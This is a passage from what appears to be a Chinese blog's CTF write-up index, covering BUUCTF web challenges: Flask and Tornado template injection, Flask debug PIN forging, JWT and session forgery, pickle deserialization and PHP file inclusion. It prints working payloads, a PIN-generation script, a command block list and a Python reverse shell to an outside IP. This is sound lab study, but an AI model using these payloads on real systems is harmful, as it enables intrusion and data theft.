!preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#x27;name&#x27;]))&#123; $this-&gt;Filename = $_GET[&#x27;name&#x27;];&#125;else&#123; $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;&#125; 实际上匹配的是 .（空格点）。``upload()内，只要文件小于1024，就将上传文件到$this-&gt;Filename` 那我们只要使$this-&gt;Filename为/var/www/html/uploads/shell.php，然后上传一个txt的一句话即可getshell 非预期解2 由于这行代码 1echo file_get_contents($uploader); 上传后会显示出$uploader这个文件的内容，所以只要使$this-&gt;Filename为flag.php 然后随便传个东西就会得到flag了。 MRCTF2020 Ezpop_Revenge TODO","tags":[],"categories":[]},{"title":"buuctf刷题——NodeJS","date":"2020-08-18T09:59:40.000Z","path":"Web_security/ctf_writeup/14.buuctf刷题——NodeJS/","text":"GKCTF2020 EZ三剑客-EzNode GYCTF2020 Node Game GKCTF2020 Node-Exe GYCTF2020 Ez_Express HFCTF2020 EasyLogin HFCTF2020 JustEscape","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"NodeJS","slug":"CTF/NodeJS","permalink":"http://ca0y1h.top/categories/CTF/NodeJS/"}]},{"title":"buuctf刷题——Python","date":"2020-08-18T09:59:30.000Z","path":"Web_security/ctf_writeup/13.buuctf刷题——Python/","text":"BUUCTF刷题——Python GYCTF2020 flaskapp 考点 Flask debug pin码安全 https://xz.aliyun.com/t/2553 解题 打开题目有一个hint界面，查看源码 意思应该是去伪造Flask pin然后执行命令。 先来验证一下： 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125; 然后还要找到一个读文件的payload，发现eval不能用，用open可以读 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; 接下来就是要获取6个关键参数 1234567891011username # 用户名modname # flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flaskgetattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径uuid.getnode() # mac地址十进制get_machine_id() # &#x2F;etc&#x2F;machine-id 第一个用户名可以通过/etc/passwd得到，即flaskweb 第二个modname一般都是默认的flask.app 第三个也是默认的Flask 第四个是app.py的绝对路径，可以直接通过报错来获取 第四个mac地址如果在真实环境是从/etc/machine-id文件读取，如果是在docker下，是从/sys/class/net/eth0/address目录下读取，转换成十进制2485410468126 转换地址：https://www.vultr.com/resources/mac-converter/ 第五个通过读取/proc/self/cgroup获取machine-id：1408f836b0ca514d796cbf8960e45fa1 然后再上脚本跑出PIN码 123456789101112131415161718192021222324252627282930313233343536373839404142#脚本出处：https://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;, &#x27;Flask&#x27;, &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; ]private_bits = [ &#x27;2485377957891&#x27;,# address &#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;# machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) system好像被禁用了，换成popen函数 RootersCTF2019 I_❤️_Flask CSCCTF 2019 Qual FlaskLight pasecactf_2019 flask_ssti CISCN2019 华北赛区 Web2 ikun 考点 逻辑漏洞 JWT伪造 pickle反序列化 解题 python脚本寻找LV6商品所在页面 123456789101112131415import requestsurl = &quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;cookies = &#123; &quot;_xsrf&quot;: &quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;, &quot;JWT&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot; &quot;-WhNxACW3PuvxHlQQ2yg&quot;, &quot;commodity_id&quot;: &quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot; &quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;&#125;for i in range(1, 501): rq = requests.get(url=url.format(i), cookies=cookies) if &quot;/static/img/lv/lv6.png&quot; in rq.text: print(url.format(i)) 跑出来的结果是page=181 但是看到这个价格很显然是要通过某种漏洞来购买，先抓包，看到参数后想到两种办法，一是直接改价格，二是改折扣。 尝试之后发现改价格没有用，改折扣提示不是admin 这个地方就很自然想到要越权，修改密码处没有逻辑漏洞，但是Cookie中包含JWT，放到jwt.io网址上解析后： 如果想要伪造一个admin的JWT需要知道secret。感觉这个地方就有点脑洞了，要用工具去爆破，我还找了很久的注入点。 再去伪造admin的JWT 更改cookie的值 查看个人中心，出现了一个hint 1\\u8fd9\\u7f51\\u7ad9\\u4e0d\\u4ec5\\u53ef\\u4ee5\\u4ee5\\u8585\\u7f8a\\u6bdb\\uff0c\\u6211\\u8fd8\\u7559\\u4e86\\u4e2a\\u540e\\u95e8\\uff0c\\u5c31\\u85cf\\u5728\\u006c\\u0076\\u0036\\u91cc 查看源码发现源码包： 题目提示了pickle，直接全局搜索，Admin.py有pickle反序列化漏洞 利用脚本生成payload： 12345678910import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a 将生成的payload放到隐藏的输入框里，只需将hidden=&quot;hidden&quot;删除即可。 SUCTF 2019 Pythonginx WesternCTF2018 shring 考点 解题 源码 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) TODO 护网杯2018 easy_tornado 考点 tornado 模板注入 解题 这道题很重要的一个地方就是观察url 1http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc 并且filehash=md5(cookie_secret+md5(filename))，所以要找到cookie_secret的值。 当不输入filehash参数的时候，url是这样的： 1http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error 并且页面回显Error，这个就需要比较敏感的注意到这里是模板注入的点。 参考文章用的就是handler.settings对象 handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所有handler.settings就指向RequestHandler.application.settings了。 所以传递error?msg=&#123;&#123; handler.settings &#125;&#125;得到cookie_secret。 HCTF 2018 Hideandseek TODO [CISCN2019 总决赛 Day1 Web3]Flask Message Board TODO HCTF2018 Admin 出题人writeup：https://www.ckj123.com/?p=147 考点 Flask Session伪造 Unicode欺骗 条件竞争 解题 方法一 Unicode编码欺骗 结合改密码的功能，看一下change函数 123456789101112def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form) 其中第6行的strlower是自己封装的一个函数，并没有使用Python的库函数： 123def strlower(username): username = nodeprep.prepare(username) return username 其中 nodeprep 来自 twisted.words.protocols.jabber.xmpp_stringprep。 并且在注册和登录的代码中都使用了这个函数，所以不能用ADMIN绕过。 这里有一篇文章讲到了nodeprep关于Unicode编码的问题： https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e 使用两次nodeprep.prepare函数会进行如下操作： 1ᴬ -&gt; A -&gt; a Unicode —&gt; 中文：https://tool.chinaz.com/tools/unicode.aspx 即第一次将其转换为大写，第二次将其转换为小写。 思路： 注册用户ᴬdmin 登录用户ᴬdmin，变成Admin 修改密码Admin，更改了admin的密码 方法二 Flask session 伪造 原理：https://www.leavesongs.com/PENETRATION/client-session-security.html 工具：https://github.com/noraj/flask-session-cookie-manager 修改name为admin： 1&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125; 再对其进行encode操作： 更改cookie的值： 提交更改，刷新页面，成功获取flag~ 方法三 条件竞争 https://tmr.js.org/p/3a03e44b/ 不由的感叹这些人的脑子怎么这么好使。。。😂 BJDCTF 2nd fake google 考点 Flask SSTI 文件读取 解题 这道题就是比较明显的Flask 模板注入漏洞了，也没有什么绕过，直接上payload： 1?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125; BJDCTF2020 Cookie is stable 考点 Python Twig模板注入 解题 和上题一样是模板注入，不过注入点在Cookie里 渲染引擎也换成了基于Python的Twig 从网上找到的 Twig poc 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125; V&amp;N公开赛 CheckIn 考点 反弹shell 文件描述符 解题 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route(&#x27;/flag&#x27;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#x27;/shell&#x27;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get(&#x27;c&#x27;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#x27;/&#x27;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;) shell路由可以执行命令，但是在执行命令之前flag.txt已经被删除了，并且不能回显命令执行的结果。 首先肯定是想到反弹一个shell，用BUU小号开一个Linux主机，尝试有bash、curl、nc、python -c等，但是这里测试后发现这些常用的命令都被禁了，无法反弹Shell。最后再换成python3就可以成功反弹shell： 1http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27 接下来的一个考点就是通过文件描述符来恢复文件。 什么是文件描述符 例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。 文件描述符储存在什么地方： /proc/&lt;pid&gt;/fd/&lt;id&gt; 查看/proc目录下的进程号 查看进程号等于10下面的fd目录 文件描述符等于3即为flag文件 CISCN2019 华东南赛区 Double Secret 考点 模板注入 RC4加密 解题 扫目录得到secret，访问提示要有secret参数，Fuzz一下发现报错 123456789File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret if(secret&#x3D;&#x3D;None): return &#39;Tell me your secret.I will encrypt it so others can\\&#39;t see&#39; rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;) #解密 deS&#x3D;rc.do_crypt(secret) a&#x3D;render_template_string(safe(deS)) if &#39;ciscn&#39; in a.lower(): return &#39;flag detected!&#39; return a 如果你传入了参数，那么它就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是“HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。 RC4加密脚本： 12345678910111213141516171819202122232425262728293031import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4加密主函数&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # print(&quot;原来的 s 盒：%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;混乱后的 s 盒：%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;调用加密程序成功。&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = &quot;&quot;.join(res) print(&quot;加密后的字符串是：%s&quot; %quote(cipher)) return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;) 得到加密后的payload后传入，拿到flag。 GXYCTF2019 Strongest Mind 考点 Python脚本 解题 注意Session的使用 123456789101112131415161718from requests import *import reimport timeimport requestsurl = &quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;s = requests.session()a = s.get(url)pattern = re.findall(r&#x27;\\d+.[+-].\\d+&#x27;, a.text)c = eval(pattern[0])a = s.post(url, data=&#123;&quot;answer&quot;: c&#125;)for i in range(1000): time.sleep(0.1) pattern = re.findall(r&#x27;\\d+.[+-].\\d+&#x27;, a.text) c = eval(pattern[0]) print(c) a = s.post(url, data=&#123;&quot;answer&quot;: c&#125;)print(a.content) DDCTF2019 homebrew event loop 考点 逻辑漏洞 flask session 解题 详细wp：https://blog.cindemor.com/post/ctf-web-16.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = &#x27;*********************&#x27; # censoredurl_prefix = &#x27;/d5afe1f66147e857&#x27;def FLAG(): return &#x27;*********************&#x27; # censoreddef trigger_event(event): # event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;] session[&#x27;log&#x27;].append(event) if len(session[&#x27;log&#x27;]) &gt; 5: session[&#x27;log&#x27;] = session[&#x27;log&#x27;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None): # haystack = action:trigger_event%23;action:buy;5%23action:get_flag; # prefix = trigger_event%23; haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystackclass RollBackException: passdef execute_event_loop(): valid_event_chars = set( &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;) resp = None while len(request.event_queue) &gt; 0: # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; event = request.event_queue[0] request.event_queue = request.event_queue[1:] if not event.startswith((&#x27;action:&#x27;, &#x27;func:&#x27;)): continue for c in event: if c not in valid_event_chars: break else: # event = action:trigger_event%23;action:buy;5%23action:get_flag; is_action = event[0] == &#x27;a&#x27; # action = trigger_event%23 action = get_mid_str(event, &#x27;:&#x27;, &#x27;;&#x27;) # args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;] args = get_mid_str(event, action+&#x27;;&#x27;).split(&#x27;#&#x27;) try: event_handler = eval( # event_handler = trigger_event#_handler action + (&#x27;_handler&#x27; if is_action else &#x27;_function&#x27;)) # ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]) ret_val = event_handler(args) except RollBackException: if resp is None: resp = &#x27;&#x27; resp += &#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27; resp += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; session[&#x27;num_items&#x27;] = request.prev_session[&#x27;num_items&#x27;] session[&#x27;points&#x27;] = request.prev_session[&#x27;points&#x27;] break except Exception, e: if resp is None: resp = &#x27;&#x27; # resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == &#x27;&#x27;: resp = (&#x27;404 NOT FOUND&#x27;, 404) session.modified = True return resp@app.route(url_prefix+&#x27;/&#x27;)def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == &#x27;&#x27; or (not querystring.startswith(&#x27;action:&#x27;)) or len(querystring) &gt; 100: querystring = &#x27;action:index;False#False&#x27; if &#x27;num_items&#x27; not in session: session[&#x27;num_items&#x27;] = 0 session[&#x27;points&#x27;] = 3 session[&#x27;log&#x27;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args): page = args[0] html = &#x27;&#x27; html += &#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;.format( session[&#x27;num_items&#x27;], session[&#x27;points&#x27;]) if page == &#x27;index&#x27;: html += &#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27; elif page == &#x27;shop&#x27;: html += &#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27; elif page == &#x27;reset&#x27;: del session[&#x27;num_items&#x27;] html += &#x27;Session reset.&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; return htmldef index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == &#x27;True&#x27;: source = open(&#x27;eventLoop.py&#x27;, &#x27;r&#x27;) html = &#x27;&#x27; if bool_download_source != &#x27;True&#x27;: html += &#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27; html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27; for line in source: if bool_download_source != &#x27;True&#x27;: html += line.replace(&#x27;&amp;&#x27;, &#x27;&amp;amp;&#x27;).replace(&#x27;\\t&#x27;, &#x27;&amp;nbsp;&#x27;*4).replace( &#x27; &#x27;, &#x27;&amp;nbsp;&#x27;).replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&lt;br /&gt;&#x27;) else: html += line source.close() if bool_download_source == &#x27;True&#x27;: headers = &#123;&#125; headers[&#x27;Content-Type&#x27;] = &#x27;text/plain&#x27; headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=serve.py&#x27; return Response(html, headers=headers) else: return html else: trigger_event(&#x27;action:view;index&#x27;)def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return &#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;.format(args[0]) session[&#x27;num_items&#x27;] += num_items trigger_event([&#x27;func:consume_point;&#123;&#125;&#x27;.format( num_items), &#x27;action:view;index&#x27;])def consume_point_function(args): point_to_consume = int(args[0]) if session[&#x27;points&#x27;] &lt; point_to_consume: raise RollBackException() session[&#x27;points&#x27;] -= point_to_consumedef show_flag_function(args): flag = args[0] # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return &#x27;You naughty boy! ;) &lt;br /&gt;&#x27;def get_flag_handler(args): if session[&#x27;num_items&#x27;] &gt;= 5: # show_flag_function has been disabled, no worries trigger_event(&#x27;func:show_flag;&#x27; + FLAG()) trigger_event(&#x27;action:view;index&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(debug=False, host=&#x27;0.0.0.0&#x27;) payload: 1action:trigger_event%23;action:buy;5%23action:get_flag; 进入队列的顺序： 1234567action:trigger_event#;action:buy;5#action:get_flag;action:buy;5action:get_flag;func:consume_point;5action:view;indexfunc:show_flag;&#96;FLAG()&#96;action:view;index 日志写入的顺序： 12345action:trigger_event#;action:buy;5#action:get_flag;[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;][&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]func:show_flag;&#96;FLAG()&#96;action:view;index 拿到flask session后解密","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Python","slug":"CTF/Python","permalink":"http://ca0y1h.top/categories/CTF/Python/"}]},{"title":"buuctf刷题——文件包含","date":"2020-08-18T09:59:20.000Z","path":"Web_security/ctf_writeup/12.buuctf刷题——文件包含/","text":"BUUCTF刷题——文件包含 BSidesCTF2020 Had a bad day 考点 LFI PHP伪协议 解题 index.php有一个参数是woofers，测试SQL注入的是发现了include函数的报错，用PHP伪协议读取文件 审计index.php 1234567891011&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file))&#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125;?&gt; 传入的category需要有woofers,meowers,index才能包含传入以传入名为文件名的文件，我们要想办法包含flag.php，直接试一下在woofers后面加/../flag 上面这个应该是非预期解，我随便试一下竟然直接出来了，这个思路可以记着。 预期解的payload的思路是利用php://filter伪协议可以套一层协议读取flag.php 1index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;flag 极客大挑战 2019 Secret File 考点 信息泄露 文件包含 解题 查看源码 访问Archive_room.php Burp抓包 访问secr3t.php 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;&#x2F;title&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;&lt;&#x2F;html&gt; include($file)文件包含，而且不能用input、data等伪协议来读取文件。 文件包含漏洞利用方式 payload： 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php ACTF2020 新生赛 Include TODO BJDCTF2020 ZJCTF 不过如此 考点 PHP伪协议读取文件 preg_match命令执行 解题 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 很明显要使用文件包含读取next.php，payload： 1http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php POST：I have a dream 解码得到next.php 123456789101112131415&lt;?php $id = $_GET[&#x27;id&#x27;]; $_SESSION[&#x27;id&#x27;] = $id; function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str ); &#125; foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;; &#125; function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]); &#125; 这里涉及到preg_replace()函数的命令执行，附上分析文章：https://xz.aliyun.com/t/2557 payload： 1http:&#x2F;&#x2F;efb75f40-dbf6-4b18-ab6e-d3e05813d2bb.node3.buuoj.cn&#x2F;next.php?\\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(%27cat%20&#x2F;flag%27); 执行system函数后面要加分号。 安洵杯2019 easyweb 考点 文件包含 解题 进入题目之后观察url：http://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=，img的参数比较可疑，用base64解码一次得到MzUzNTM1MmU3MDZlNjc=，感觉又要base64解码一次得到3535352e706e67，这个就比较像16进制了，转码后发现是555.png，很明显的文件包含，写一个python脚本生成index.php的参数。 1234567import base64import binasciifilename=&#x27;index.php&#x27;.encode(&#x27;utf-8&#x27;)hex = binascii.b2a_hex(filename)encode_str = base64.encode(base64.encode(hex))print(encode_str) 得到index.php的源码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; 第一步md5碰撞，和我之前在这篇文章BJDCTF2020 